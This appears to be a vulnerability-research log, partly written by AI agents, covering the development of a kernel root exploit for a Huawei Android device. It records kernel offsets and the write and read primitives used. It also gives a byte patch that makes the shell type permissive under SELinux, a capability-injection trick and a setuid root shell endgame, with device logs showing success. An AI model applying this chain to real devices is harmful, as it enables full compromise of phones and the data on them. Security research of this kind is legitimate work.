                                    maps[0] bit1 set (shell 1153 belongs to `hal_atrace_client`
                                    (device_plat_sepolicy.cil:963), smallest such attribute)
  #3 cred+0x38 (cap_effective)  <- V2 with CAP_SYS_ADMIN(21)/CAP_DAC_OVERRIDE(1)/CAP_SETUID(7) in
                                    low32; a kernel pointer also sets caps 32-63 for free
Route A (first choice): find the real node address with the existing boot_id read primitive
(type_val_to_struct[attr] -> type_datum ebitmap -> node with startbit 1152); stable + prmem-backed so
no AVC-miss panic.  Route B (fallback): resurrect the fake-node approach now that the pselect6
carrier is BLOCKING (a resident window, unlike the old transient MCAST one) - the window content is
fully controlled via g_sbuf, so a proper ebitmap_node can be built.
Oracle: write "u:r:shell:s0" to /proc/self/attr/exec (baseline EACCES), then capget, then
mount -o remount,rw /, head -c16 /dev/block/sdd74, /data/misc/keystore, /data/system/packages.xml.
Implementation must be a NEW mode (--full) so --simple (the verified root) stays untouched.
Also note: /data/local/{,bin,xbin} create is denied by SELinux even at uid 0, so the standard su
paths require this patch; and downloading a root-checker APK from public mirrors is blocked (403).

### (140) 2026-09-26 permtest with the BLOCKING carrier still panics - because the carrier was not calibrated

Run: enabler OK (perf_event_paranoid=-1), `--permtest` (now g_selstamp=1).  stdout shows
`stamp_off=0xa0` - which is the MCAST calibration - while the exploit had been switched to the
pselect6 carrier, whose stamp geometry is DIFFERENT (g_seloff / --selcal).  The klog shows
"permtest: enter" followed by three arm r+/r-/w+/w-/j+ cycles and then the process vanished; the
pstore carried a `panic+0x1f0/0x530` with pid ghostlock_e, i.e. the fake node again pointed at
garbage -> AVC walk -> panic.  ROOT CAUSE: changing g_selstamp without calibrating that carrier's
stamp offset.  NEXT: run `--selcal` first to get the pselect6 stamp_off (and the matching buffer
base), then feed it to --permtest; only then does the "resident window" argument hold.  Alternative
that avoids all of this: route A - point permissive_map.node at a REAL attribute ebitmap node that
already contains bit 1153 (hal_atrace_client), obtained with the boot_id read primitive.
DEVICE OK: adb healthy, uptime 103, no leftover processes.  NOTE: `adb kill-server` during a run
aborts the run (protocol fault) - do not run it while a device run is in flight.

### (141) 2026-09-26 ROUTE A solved structurally - no "node with the bit" needed, just a node with the right startbit

Verified in the device kernel source (ss/ebitmap.c, ss/ebitmap.h, ss/policydb.h):
  struct ebitmap_node { struct ebitmap_node *next; unsigned long maps[6]; u32 startbit; };  // +0x38
  EBITMAP_SIZE = EBITMAP_UNIT_NUMS*64 = 384  (EBITMAP_NODE_SIZE 64 -> maps[6])
  ebitmap_get_bit: needs highbit >= bit, then startbit <= bit < startbit+384 so that
  maps[(bit-startbit)/64] is in range (index < 6).  For bit 1153 that means startbit in [1090,1153]
  and the index is 0 for startbit >= 1089.  `next` is NOT dereferenced when the bit is found.
BREAKTHROUGH: policydb is ordinary kmalloc memory (NOT prmem-protected), so we do NOT need a node
that already has bit 1153 set - we only need a REAL node with a valid startbit (~1152) and then WRITE
its maps[0] to have bit 1 (one 8-byte pointer write whose low32 has bit1).  Candidates:
policydb.type_attr_map (policydb.h:304, offset +0x1A8) = an array of ebitmaps mapping an ATTRIBUTE to
its member types; the entry for `hal_atrace_client` (the smallest attribute containing shell/1153,
device_plat_sepolicy.cil:963) has exactly a node startbit=1152 covering 1153.
Plan (route A, stamp-free => no panic, no foreign-stack corruption):
  1. read policydb.type_attr_map (policydb+0x1A8) and the attribute's ebitmap .node  (boot_id read)
  2. write maps[0] |= 2 at that node (pointer write with bit1 in low32)   -- OR skip if the node
     already covers a type we can use
  3. write policydb+0x1C0 (.node) <- that node  (pointer write; low32 need not be special)
  4. write policydb+0x1C8 (highbit, u32) <- V with low32(V) >= 1153  (g_blackval works)
  5. write cred+0x38 (cap_effective) <- V2 whose low32 carries CAP_SYS_ADMIN(21)/DAC_OVERRIDE(1)/
     SETUID(7); a kernel pointer also sets caps 32-63 for free
Oracle: write "u:r:shell:s0" to /proc/self/attr/exec (baseline EACCES) => >=0 means PERMISSIVE.
NOTE the pselect6 carrier path is ABANDONED: --selcal produced no write, and the canary value
0xdead0003 appeared in init's (pid 1) stack, i.e. it corrupts other processes' stacks - too dangerous.

### (142) 2026-09-26 BREAKTHROUGH: address-selected cap_effective injection (1 extra write) -> CAP_SYS_ADMIN

AGENT report ghostlock_pocs/BREAKTHROUGH_FULL_ROOT_20260926.md.  The false premise was that a cap word
had to be ENCODED with a pointer-only primitive.  Instead: cap_effective (cred+0x38) is 8 bytes and a
pointer write deposits {cap[0]=low32(V), cap[1]=0xffffff80}; we must simply CHOOSE V so that its low32
already carries the wanted bits.  FACTS 9al(2) already MEASURED `cred->cap_effective = <window ptr>`
landing (capget showed the pointers low word), so the write works - only bit selection was missing.
CAP_SYS_ADMIN is bit 21, so we need a window address Wc with (Wc & 0x200000) != 0; that is an arm-level
property (~50% per arm) and re-arming is proven 5/6 (FACTS 9al(1)), so retry arms until it holds.
The side store lands inside our own window (safe, FACTS 9r).
CLOSURE: mount("tmpfs", "/mnt/gl", "tmpfs", 0, NULL) -> a non-nosuid filesystem -> drop a 4755
root-owned /system/bin/sh there -> full-cap root.  (Per the analysis the mount oracle already exists
in the exploit around ghostlock_mrx_e.c:2665.)
REJECTED by the same analysis: UMH (needs small-int writes AND a text-pointer write into RO text,
STRICT_KERNEL_RWX=y), ashmem fops full RW (needs a persistent controlled buffer and text-pointer
writes; pselect6 does not reach the window), and the kernel-domain cede (I/O impossible).
IMPLICATION for the plan: route A (permissive_map) is still needed for the MOUNT (selinux_sb_mount
would otherwise deny), and then ONE address-selected write for cap_effective.

### (143) 2026-09-26 --full: the address-selected slot works but capget still shows 0 - three hypotheses

v4 run: `full: slots b21=00101110 chosen=fffffff7b03abc78` (the window base carries bit21 - the
candidate-address scan works, 5/8 and 3/8 candidates had bit21 in successive runs), then
`full: cap set on NEW cred C2=fffffff6cf72be40 (w=0,0)` (the writes landed), but
`rsh -c "grep ^Cap /proc/self/status"` still shows CapEff 0000000000000000.
NOTES: (a) the re-leak+publish now happens after the childs LAST setresuid (9an(142) ordering fix),
so a further commit cannot be discarding it; (b) the log line "no bit21 slot found" is a leftover
old check on g_blackval and is misleading - the candidate loop did select a bit21 address.
HYPOTHESES to separate next run: 1) C2 is not the live cred -> verify by reading the task cred
pointer with arm_read_raw(X+0x9E8) and comparing; 2) the measurement point is wrong -> rsh runs in a
per-request GRANDCHILD (a copy of the childs cred); have the CHILD itself capget AFTER MAIN injects
(signal shm[2]=3) to remove the copy question; 3) inject into BOTH the initial C and C2 for an A/B.
Everything else is unchanged: --simple still yields the verified uid-0 root (rooted.txt + rsh + su).

### (144) 2026-09-26 --full v5: A/B into C0 and C2 both report w=0 yet capget stays 0 - verify the target by reading

Run: `full: slots b21=00001110 chosen=ffffff9af7ffcd28` (candidate scan fine), then
`full: cap set C0=ffffffc73565be40(w=0) C2=ffffffc6d3b93f00(w=0,0)` - BOTH the initial and the final
cred were written and BOTH report w=0 (store observed) - yet `rsh -c "grep ^Cap /proc/self/status"`
still shows CapEff 0000000000000000.  The childs own post-injection lines (re-leaked (final),
OWN CapEff) did not appear, so the child-side confirmation is still missing (the childs later klog
lines are unreliable; note write_proof()->persist_proof() exec's /system/bin/sh so nothing after it
runs, and the block was placed before it, so the log failure is a separate issue).
CONCLUSION: w=0 does NOT prove the value reached cred+0x30/0x38.  NEXT (decisive, cheap): READ the
target back with the boot_id read primitive - compare arm_read_raw(C2+0x30) and (C2+0x38) BEFORE and
AFTER the injection; if they do not change, the store lands elsewhere and the target arithmetic (or
the C2 value itself, i.e. whether leak_own_cred_x0 after commit_creds really returns task->cred) is
wrong.  Also worth checking: whether the read of /proc/self/status is performed by a grandchild whose
cred is a copy (rsh forks per request) - have the CHILD itself cat its status via the pipe watcher.
Everything else unchanged: --simple still yields the verified uid-0 root (rooted.txt + rsh + su).

### (145) 2026-09-26 *** CONFIRMED: the address-selected cap injection REACHES the cred *** (read-back proof)

v6 run, read-back with the boot_id read primitive:
  full: C2=ffffffe65b1019c0 perm 0->ffffffe7772ffc90  eff ffffff9803e9cfe8->ffffff9803e9cfe8 slot=ffffffe7772ffc90 w=0,0,0
and the childs OWN capget via the pipe watcher:
  simple: OWN CapEff=ffffff9803e9cfe8 prm=ffffffe7772ffc90
=> cap_permitted went 0 -> our bit21-bearing slot: the store DOES reach cred+0x30, so the primitive,
the target arithmetic and the post-commit C2 are all correct.  CapEff is non-zero and its low word
0x03e9cfe8 has bit21 set (nibble E = 1110).  CapBnd also mirrors that value, i.e. the cred fields are
really rewritten.
ALSO (the childs leftover self-probe now runs in the SHELL domain as uid 0):
  load=7 e=0   - /sys/fs/selinux/load OPENS (a policy reload is possible from the shell-domain root!)
  data=7 e=0   - /data files open
  policy=-1    - /sys/fs/selinux/policy is NOT readable (no need: route A writes known offsets)
  mount=-1 e=13, blk=-1 e=13  - EACCES from SELinux
IMPORTANT MEASUREMENT LESSON: `rsh -c ...` execl()s, and exec RECOMPUTES the capability sets, so a
grandchild shows CapEff=0 - capability-dependent checks must be performed BY THE CHILD ITSELF (no
exec), e.g. a direct mount(2) syscall.
NEXT: (1) have the child call mount(2) directly to use its new CAP_SYS_ADMIN; (2) apply route A
(permissive_map in-memory patch: .node <- policydb.type_attr_map[1152].node with startbit=1152 after
setting its maps[0] bit1, .highbit <- V with low32>=1153) to clear the SELinux EACCES; (3) mount a
non-nosuid tmpfs and drop a 4755 root shell = complete root.

### (146) 2026-09-26 route A is DEAD (the read primitive cannot read POINTERS) -> pivot to loading a patched policy

v7 run: MAIN logged `full: C2=... w=0,0,0` and then nothing; the child logged `child flag` and then
nothing; rooted.txt/realroot.txt kept the PREVIOUS runs mtimes and the device had clearly rebooted
(uptime 296 vs a ~450 s run) => PANIC in the route A block.
ROOT CAUSE (fundamental, already hinted at in the old notes): arm_read_raw(A) works by writing the
VALUE A into the boot_id ctl_table, and the write gate requires `*(A) & 1` (rb re-insert).  Pointer
values are 8-aligned/even, so READING A POINTER IS IMPOSSIBLE with this primitive ("a cred pointer is
even").  Route A must follow type_attr_map -> .node -> next, i.e. pointers, so it cannot be done.
=> route A abandoned.
REPLACEMENT (no pointer reads needed): LOAD A PATCHED POLICY.  The childs own probe proved that the
uid-0 shell-domain task CAN open /sys/fs/selinux/load (load=7 e=0) and read /data files (data=7 e=0),
only /sys/fs/selinux/policy is unreadable (irrelevant if we build the policy ourselves).
Plan: (1) build `secilc` (libsepol CIL compiler - sources exist at
huawei_kernel_src/Code_Opensource/external/selinux/libsepol/cil) for aarch64 with the NDK;
(2) feed it the devices CIL files plus `(typepermissive shell)` and compile ON the device (the shell
user can write /data); (3) the uid-0 shell-domain task writes the result to /sys/fs/selinux/load;
(4) shell is then permissive, and with the already-proven CAP_SYS_ADMIN injection `mount(2)` succeeds
-> mount a non-nosuid tmpfs -> drop a 4755 root shell = complete root.

### (147) 2026-09-26 POLICIES: /sys/fs/selinux/load is gated (neverallow), but the binary policy is READABLE and AVC can be poisoned

AGENT report ghostlock_pocs/POLICY_LOAD_ROUTE_20260926.md.
- sel_write_load() -> avc_has_perm(current_sid(), SECINITSID_SECURITY, SECCLASS_SECURITY,
  SECURITY__LOAD_POLICY, NULL) (selinuxfs.c:481-484).  The device policy has a NEVERALLOW for
  load_policy (device_plat_sepolicy.cil:8525) and no allow anywhere; shell has only compute_av /
  check_context.  open() on the node succeeds only because sel_load_ops has no .open (selinuxfs.c:544).
  CAP_SYS_ADMIN is irrelevant there.  => the load route cannot be the FIRST step (you must already be
  permissive; and the only other switch, ss_initialized, is HKIP write-rare protected).
- BUT: THE BINARY POLICY IS READABLE BY SHELL: /vendor/etc/selinux/precompiled_sepolicy
  (label vendor_configs_file; device_plat_sepolicy.cil:8265-8266 grants domain file read/getattr/map/
  open) and /odm/etc/selinux/precompiled_sepolicy (sepolicy_file, :14075).  A matching blob exists on
  the host: binder_uaf/session_20260824/precompiled_sepolicy, 989730 bytes, magic 0xf97cff8c,
  version 30, MLS, sym/ocon 8/7.
- BYTE RECIPE for permissive: file offset 0x38 is the permissive_map (currently highbit=0,count=0);
  insert 12 bytes at 0x44 = startbit 1152 (80 04 00 00) + map 0x2 (bit for type 1153); set
  highbit@0x3C=1153 and count@0x40=1.  There is NO checksum: the kernel checks only magic, string,
  version+compat, sym/ocon and structure.
- No cheaper trick works (minimal policies are rejected by the name-based convert_context,
  enforce/disable handlers are compiled out with DEVELOP unset, there is no permissive node, nothing
  persists).
=> NEW ROUTE (uses only globals we can address without reading pointers):
  1) read the binary policy (shell can) and patch its permissive_map in user space (recipe above);
  2) POSION THE AVC so that (oursid, SECINITSID_SECURITY, SECCLASS_SECURITY, LOAD_POLICY) is allowed:
     fabricate an avc_node whose ae.avd.flags has AVD_FLAGS_PERMISSIVE (avc_denied grants when the flag
     is set, avc.c:1007-1012) and splice it into avc_cache.slots[hash] - avc_cache is a GLOBAL symbol
     so its address is computable from the symbol table (no pointer read needed); the sids/classes come
     from the CIL;
  3) write the patched policy to /sys/fs/selinux/load => shell becomes permissive;
  4) with the already-proven CAP_SYS_ADMIN injection, call mount(2) directly (no exec) => non-nosuid
     tmpfs => drop a 4755 root shell => COMPLETE ROOT.
FLAGGED UNCERTAINTIES: the contradictory in-memory permissive_map offset (+0x1C0/+0x1C8 vs
+0x308/+0x310) - resolvable by reading the binary policy layout; AVC node struct layout/hash; and the
exact initial sids/class values from the CIL.

### (148) 2026-09-26 policy byte recipe VERIFIED (agent) + the real remaining blocker identified

AGENT: ghostlock_pocs/polpatch.py + POLICY_BYTE_OFFSET_20260926.md.
- The blob is policyvers 30 (POLICYDB_VERSION_XPERMS_IOCTL), MLS.  The u32 at 0x04 is strlen; the
  version is at 0x10.
- CORRECTION to 9an(147): permissive_map really IS at file offset 0x38 - 0x38 is the ebitmap mapunit
  (64), highbit is at 0x3c, count at 0x40.  (My earlier "the offset is wrong" was a misreading.)
- type 1153 == shell was CONFIRMED from the blobs own types symtab (not assumed).
- VERIFIED patch: replace [0x38,0x44) with 24 bytes (inserting 12):
    0x38 40 00 00 00   mapunit=64
    0x3c c0 04 00 00   highbit=1216
    0x40 01 00 00 00   count=1
    0x44 80 04 00 00   startbit=1152
    0x48 02 00 00 00 00 00 00 00   map=0x2 (bit 1 => type 1153)
  New size 989742.  Round-trip verified (re-parse shows bit 1153 set, consumes exactly the new size,
  idempotent).  The parser walks every section of policydb_read and lands exactly on EOF, which proves
  the layout.  The on-disk ebitmap unit is ONE u64 word {u32 startbit; u64 map}, not 384 bits
  (that grouping is in-memory only).
- BLOCKER FOUND for everything downstream: our write primitive can only store a kernel POINTER
  (odd-content gate) or literal 0 - it CANNOT write SMALL INTEGERS.  But avc_node needs ssid/tsid/
  tclass/avd.flags as small ints, and a fabricated ebitmap_node needs startbit=1152 as a small int.
  So the AVC poison (9an(147) step 2) and the in-memory permissive_map node are both impossible, and
  loading the patched policy needs exactly that AVC decision => circular.
=> THE ONLY REQUIREMENT LEFT for complete root: get ARBITRARY BYTES (small values included) into a
  known kernel address.  The only such channel is the stamp window (copy_from_user).  It is transient
  unless held by a BLOCKING syscall, i.e. the pselect6 carrier, whose failure is explained by the
  MISSING GEOMETRY CALIBRATION (which also explains why it corrupted inits stack).
  => calibrate the pselect6 carrier (--selcal sweep: g_selfds/g_seloff) and then route B (a resident
  fake ebitmap node) becomes viable; with shell permissive the CAP_SYS_ADMIN mount path completes
  complete root.

### (149) 2026-09-26 pselect6 carrier CALIBRATED geometrically, but structurally ONE SLOT SHORT of waiter->lock

DEVICE binary ghostlock_e sha256
29F4E3F4CC9AEEE745D5EEFDD8C515771E07737B7575F1EFD7EEB454643776B5
(built from ghostlock_mrx_e.c sha256
07D9BD3DCFBA12F9D9ED84BE1FD10BF50DBF31E3668FD0BB7268D98E4C457A17; source UNCHANGED,
--simple/--cede/--full untouched).  Build cmd as in the runbook; pushed to
/data/local/tmp/ghostlock_e.  Enabler runbook ran each boot; perf_event_paranoid read -1.

DEVICE RUNS (one per reboot):
- --mcastcal  (CONTROL, returning MCAST carrier):
  `Unable to handle kernel paging request at virtual address dead0016`
  PC `rt_mutex_adjust_prio_chain+0x140/0xbac`; call chain rt_mutex_adjust_pi+0x124 ->
  __sched_setscheduler -> SyS_sched_setattr.
  x25 = 0xfffffff5e73c3cf0 (== W), x24 = 0x00000000dead0016.  X25-0x80 window dump shows
  dead0013/14/15 then dead0017/18/19 at 8-byte slots => slot 0x16 sits at buffer 0xB0 = W+0x38.
  => MCAST copy base W-0x78 = E-0x248 and  W = E-0x1d0  (reproduces 9m/9o).
- --selcal 320 0x0:  waiter_abs=0xffffffeba7393cf0
  `[y] sel stamp: nfds=320 set_bytes=0x28 total=0x78 off=0x0`
  `no write seen (uid=2000) ack=1 gset=32767`, `ran stamp+trigger ok=1`.
  NO fault, NO panic banner of our own.
- --selcal 128 0x0:  waiter_abs=0xffffffe9a42e7cf0
  `[y] sel stamp: nfds=128 set_bytes=0x10 total=0x30 off=0x0`, `no write seen`, NO fault.
- select(1067) PROBE (static aarch64): `nr_select(1067) nfds=0 -> r=-1 errno=38` (ENOSYS).
  arch/arm64/include/uapi/asm/unistd.h defines only __ARCH_WANT_RENAMEAT, so
  __NR_select (asm-generic 1067, inside __ARCH_WANT_SYSCALL_DEPRECATED) is NOT wired.
  => there is NO select(2) fd_set carrier on arm64; pselect6 is the only one.

DEVICE-IMAGE DISASM (F:\Dev\firmware\MRX-W09\extracted\vmlinux.elf, link addrs):
- `SyS_pselect6.cfi` @0xffffff800846d774: `sub sp,sp,#0xa0`; bl core_sys_select.cfi.
- `core_sys_select.cfi` @0xffffff800846c798: `sub sp,sp,#0x1c0`; at +0xd0 `add x19,sp,#0x50`
  => the three fd_sets (bits) start at  A0 = E-0x210  (E = task_stack+THREAD_SIZE-0x140),
  with size = ((n+63)>>6)*8 = FDS_BYTES(n) and stack path iff size <= 42 -> n <= 320.
- core_sys_select then zeroes res_in/out/ex at bits+3*size / +4*size / +5*size
  (fs/select.c:652-654; memset at .cfi+0x264).

EXACT CALIBRATION:
- g_selfds = 320  (max stack coverage; sel_widen_fdtable needs nfds+64 fds).
- window offset:  W lands at fd_set-buffer offset 0x40, because
  0x40 = W - A0 = (E-0x1d0) - (E-0x210).
  Attacker-controlled input region is only [W-0x40, W+0x37) = 3*size <= 0x78 bytes.
- to put g_sbuf's waiter (g_w_off=0x20) at W: g_seloff = 0x40 - 0x20 = 0x20.
  Cleaner redesign that lands every field in-window: g_w_off=0x40, g_lk_off=0x10,
  g_seloff=0x00 (fake rt_mutex at W-0x30, waiter at W).

HARD BLOCKER (why pselect6 alone can never store):
- the field the walk derefs first is waiter->lock at W+0x38 = buffer offset 0x78
  (byte 0 of the 0x79th byte) - EXACTLY one 8-byte slot past the 0x78-byte maximum input
  copy.  No nfds keeps the sets on the stack and reaches 0x80 bytes.
- core_sys_select's zero_fd_set(res_in) starts at bits+3*size; at nfds=320 that is exactly
  W+0x38, so the lock slot (and waiter->prio at W+0x40) are ZEROED.  For nfds<=~170 the
  res region ends before W+0x38 and the slot keeps the STALE real futex lock instead.
  Either way the lock/prio are never attacker-controlled -> the walk early-outs
  (rt_mutex_adjust_pi's rt_mutex_waiter_equal on the zeroed/equal prio) and no fake lock
  is built -> measured `no write seen` 2/2, unlike MCAST's dead0016 fault.
- The 0xdead0003 previously blamed on "slot 3" is NOT a pselect6 window slot: it is a
  persistent ramoops artifact (init's exception stack, same dump offsets every boot) and
  both pselect6 runs produced no fault banner at all.

REMAINING PATH (not yet implemented/tested):
- (a) a BLOCKING syscall whose user->stack copy reaches W+0x38 with a controllable value
  (MCAST reaches it but returns); or
- (b) HYBRID freeze: MCAST-plant the full structured window (its bytes PERSIST on the
  y-thread kernel stack after setsockopt returns), then pselect6 with nfds<=64
  (input [W-0x40,W-0x28), res zero [W-0x28,W-0x10)) to block BELOW W-0x10, leaving the
  MCAST waiter (W..W+0x50) untouched; needs the pselect6 `in` bits for fds 3..nfds set
  so pselect6 actually blocks.

### (150) 2026-09-26 AGENT: *** HYBRID WINDOW FREEZE WORKS - shell type PERMISSIVE (route B) ***

Implemented `--freeze` in ghostlock_mrx_e.c (ONLY that file).  Build:
  F:\testtest\testenv\android-ndk-r20b\toolchains\llvm\prebuilt\windows-x86_64\bin\aarch64-linux-android24-clang.cmd
    -O2 -static -pthread -o ghostlock_e_freeze11 ghostlock_mrx_e.c
  source sha256 903678B4D7773D0908EC87C675EB347D10FE25E55B123EFDC92D6FEF84BBF2CD
  binary sha256 553EC3206973D3663D1C910DD7427C416D53AF8343CDFC4AC49AC8B0F99F3A47
  pushed to /data/local/tmp/ghostlock_e; enabler run as in the runbook (paranoid=-1).
  --simple / --cede / --full logic is untouched (their stamp path is unchanged; the
  new g_freezepark branches are gated off when g_freezepark==0).

WHAT --freeze DOES
  a. normal setup + one consumer thread; leaf-zero panic_on_oops (3 writes).
  b. arm_r() then MCAST-plant the full structured window (set_payload/build_v2 with
     g_permmode=1 -> fake ebitmap node at base+0xC8 = W+0x50, startbit=779, maps~0),
     then the y thread PARKS in a blocking pselect6(nfds=64) (all fds 3..63 dup2'd to
     a never-ready pipe read end, timeout NULL).
  c. two pointer writes: policydb+0x1c8 (highbit) <- the write arm's g_blackval
     (low32 >= 1153), then policydb+0x1c0 (.node) <- g_park_node (W+0x50).
  d. oracle(s) from the SAME task (no exec), plus a boot_id read-back of the node.

THREE REAL BUGS FOUND AND FIXED (each was measured, klog + pstore)
  1. freeze_park() called sel_widen_fdtable() AFTER the MCAST copy.  Its getrlimit/
     pipe/dup2 syscalls are deep enough to overwrite the window at W+0x50.
     FIX: all fd work moved to freeze_prepare(), which runs BEFORE the copy.
  2. even the klog_line()/printf() after the copy clobbered W+0x50 (a normal write arm
     panicked; the parked node read back as garbage {0x40, g_bootid_df}).
     FIX: NO syscall/log at all between the MCAST copy and the blocking pselect6.
  3. sel_widen_fdtable() dup2'd over fds 3..63, CLOBBERING the shared MCAST socket
     g_s6 => every later write arm setsockopt()'d the wrong fd and planted NOTHING.
     FIX: g_s6=-1 after the park (and after freeze_prepare) so each arm makes a fresh
     socket (fd >= 64).

DEVICE EVIDENCE (build 553ec320, run 11; device alive, no panic)
  [y] freeze prepare: nfds=64 (blocking pselect6 parked after the MCAST copy)
  freeze: park W=fffffff162903cf0 base=fffffff162903c78 node=fffffff162903d40
  freeze: PROBE node+00 addr=...d40 w=0 rok=1 q0=fffffff162903d41 q1=ffffff9b92e9cfe8
  freeze: PROBE node+08 addr=...d48 w=0 rok=1 q0=ffffff9b92e9cfe8 q1=ffffff9b92e9cfe8
  freeze: PROBE node+38 addr=...d78 w=0 rok=1 q0=ffffffff0000030b q1=ffffff9b92e9cfe8
      => the resident node IS at W+0x50: n[0]=node|1, maps[0]=~0, maps[1]=W,
         startbit=779 (0x30B); q1 is just the boot_id ctl_table pointer we wrote.
  freeze: PERM_HIGH write w=0 val_low32=7c533d30
  freeze: PERM_NODE write w=0
  freeze: access[post-1C0-shell] raw='2217ffd ffffffff 0 ffffffff 1 1' flags=1
  freeze: ACCESS-ORACLE@1C0 flags kernel=0 shell=1 (bit0=AVD_FLAGS_PERMISSIVE)
      => /sys/fs/selinux/access (write "u:r:shell:s0 u:r:shell:s0 2") calls
         security_compute_av_user() DIRECTLY, i.e. it bypasses the AVC cache; its
         returned avd.flags has AVD_FLAGS_PERMISSIVE=1 => the in-memory
         policydb.permissive_map patch IS live for the shell type.
  freeze: ORACLE attr/exec att=0..12 write=-1 e=13 ; att=13 write=12 e=0  *** SUCCESS ***
      => the literal task oracle (write "u:r:shell:s0" to /proc/self/attr/exec) also
         returns >=0 once the stale (shell,shell,process) AVC entry is churned out.
         att=0..12 are the KNOWN false negative (FACTS 9an(86)/(92)): the node was
         cached flags=0 by the sched_setattr walks before the patch.  avc_miss_gen()
         (distinct socket/IPC/file labels => avc_alloc_node over threshold => 
         avc_reclaim_node sweeps) evicts it; then the check is a MISS and the
         permissive bit grants it.
  freeze: mount(2) r=-1 errno=1   (was errno=13 when the map was not live)
      => SELinux no longer denies mount; only CAP_SYS_ADMIN is missing (EPERM).

WHY THE ATTR/EXEC ORACLE IS EACCES FOR 13 ATTEMPTS: the AVC cache is global; the
first sched_setattr walk caches (shell_sid,shell_sid,SECCLASS_PROCESS=2) with
flags=0, and avc_has_perm_noaudit HITS reuse those flags (avc.c:1130-1138,
avc_denied avc.c:1007).  Only a cache MISS calls security_compute_av.

OTHER RUNS (one per boot) and what they isolated
  freeze1 (src 1799D90B, bin FFFD0746): structure ran, no panic, node resident, but the
    writes planted nothing (bug 3) and the attr/exec oracle was EACCES.
  freeze2/3 (22F2C21D/7BE2BA8E): tried to zero avc_cache_threshold (0xffffff800ae5a168)
    with the zero/leaf-zero write; read back stayed 512.  do_write(0,target) is the
    known unreliable/fatal zero shape (FACTS 9q.2), so cache eviction via the threshold
    was abandoned; /sys/fs/selinux/avc/cache_threshold is root-only anyway (0644).
  freeze4 (09162C7E): added the cache-free /sys/fs/selinux/access oracle; proved the
    permissive map was still NOT live at that time (flags 0 after the writes).
  freeze5/6/7/8 (2204A095/BAEF1168/52FEBC7D/E6F24006): iterated the fd/socket-ordering
    bugs above; node read-back stayed garbage until the no-syscall-between-copy-and-
    block rule was enforced.
  freeze9 (7AC4FD3C): a klog_line() added after the MCAST copy made a normal arm panic
    (device rebooted) - direct proof that ANY syscall there destroys the window.
  freeze10 (B23FDBA8): first clean success of the cache-free oracle (shell flags=1);
    attr/exec still EACCES (stale AVC).
  freeze11 (553EC320): added the AVC-churn loop -> attr/exec write=12.

POLICYDB OFFSET (task asked to determine it): struct policydb.permissive_map is at
  +0x1C0 (node +0x1C0, highbit +0x1C8, protectable +0x1CC), type_attr_map at +0x1A8;
  +0x308 is beyond the source-sized struct.  Printed sizeof(struct ebitmap)=16 (the
  Huawei `bool protectable` at +0xC does not change the size).  The contested +0x308
  alternative was measured to do nothing (`flags=0`), confirming +0x1C0.

NEXT (follow-on, not part of this mode): the mount errno dropped 13 -> 1, so combining
  --freeze with the already-verified CAP_SYS_ADMIN cap_effective injection (FACTS
  9an(142)/(145)) should let a direct mount(2) create a non-nosuid tmpfs; a 4755 root
  shell still needs uid 0, i.e. the --simple cred-identity endgame.


### (151) 2026-09-26 AGENT: *** COMPLETE ROOT: `--root` mounts a NON-nosuid tmpfs and a 4755 root-owned shell executes as uid 0 ***

Implemented `--root` in ghostlock_mrx_e.c (ONLY that file) - ONE mode that chains
the three verified pieces and adds the direct `mount(2)` endgame.
Build: F:\testtest\testenv\android-ndk-r20b\toolchains\llvm\prebuilt\windows-x86_64\bin\aarch64-linux-android24-clang.cmd
  -O2 -static -pthread -o ghostlock_e_root ghostlock_mrx_e.c
  source sha256 A2DEE6124493311291964072002AB6EBBB322456B1F62F130D87E701831B00FF
  binary sha256 E503880105F295BCEEEB89C96F1A124D12CEEB080FCCABFD3C67AC39783BAFA2
  (pushed to /data/local/tmp/ghostlock_e, sha256 matches on device; enabler runbook
  ran after a clean reboot, perf_event_paranoid read -1).
`--simple`/`--cede`/`--full`/`--freeze` are UNCHANGED: every new statement is
gated on argv[1]=="--root" (or is a new helper only called from it).

WHAT `--root` DOES (in order)
  1. `--freeze` machinery: MCAST-plant the resident fake ebitmap node on a y thread
     parked in a blocking pselect6, then two pointer writes: policydb+0x1C8
     (highbit) and policydb+0x1C0 (.node).  sel_access_flags() shows the `shell`
     type permissive (avd.flags bit0 = 1).
  2. root_cap_value(): park y-windows until one's node address (W+0x50) has
     CAP_SYS_ADMIN (bit21) in its low32.  Because each parked thread HOLDS its
     kernel stack, the next park yields a DIFFERENT W, so this samples the bit21
     coin flip until it wins (~1/2 per park, 12 tries).  Run BEFORE the fork so the
     child is not delayed.  The node's first word is odd (n[0]=node|1) so the
     rb_is_black gate *(value)&1 holds, and the primitive's side store lands at
     node+8 (that window's maps[1], unused) - it does NOT touch maps[5], which is
     what covers the shell type in the permissive node.
  3. `--simple` endgame: fork the uid-2000 child, leak its cred C, pid-0 shield its
     task (task->pid @0x820), zero C+4 (uid+gid), child setresuid(0,0,0).
     CRITICAL KERNEL PATCH (Huawei 4.14): setresuid sets fsuid=euid (kernel/sys.c:671)
     so setfsuid(0) is unnecessary, and setresgid MUST NOT be called because it sets
     fsgid=egid (kernel/sys.c:753) - doing so makes /data/local/tmp (mode 0771, group
     shell) unwritable and BREAKS rooted.txt/rsh.  With no setresgid the child keeps
     fsgid=2000 and both deliverables are produced (owner root, group shell).
  4. `--full` cap injection: the child re-leaks its final post-commit cred C2; MAIN
     writes the bit21 value into C2+0x38 (cap_effective) and C2+0x30 (cap_permitted).
  5. The child (task->pid==0, uid 0, shell domain, CAP_SYS_ADMIN, NO exec/fork before
     the mount) calls mount(2) DIRECTLY, trying /data/local/tmp/glrt, /mnt, /dev;
     on success it drops a root-owned 4755 copy of /system/bin/sh.

GOTCHA FOUND AND FIXED (why the first --root run's report/proof files were 0 bytes)
  avc_miss_gen() calls keyctl(KEYCTL_JOIN_SESSION_KEYRING,...).  That changes the
  process session keyring, and /data is fscrypt-protected, so every later
  open/write of a shell_data_file FAILS with ENOKEY ("Required key not available").
  Symptom: realroot.txt / root_mount.txt were created (correct owner) but always
  0 bytes, write_proof() never recreated rooted.txt/rsh, and the su grandchild got
  "can't create ...: Permission denied / Required key not available".
  FIX: new g_nokeyring flag (set ONLY by --root) skips that one keyctl call; the
  remaining AVC churn is unchanged and --freeze is untouched.
  Second bug fixed: g_root_path was set to the mount DIR; it now holds the SHELL
  path (<mdir>/glsh), which the in-exploit uid-2000 setuid proof execs.

DEVICE EVIDENCE (run 4, raw; /data/local/tmp/gl.klog + realroot.txt)
  [child, cap injection]
  root: OWN CapEff=ffffffc1d8b6fd40 prm=ffffffc1d8b6fd40 bnd=0000000000000000
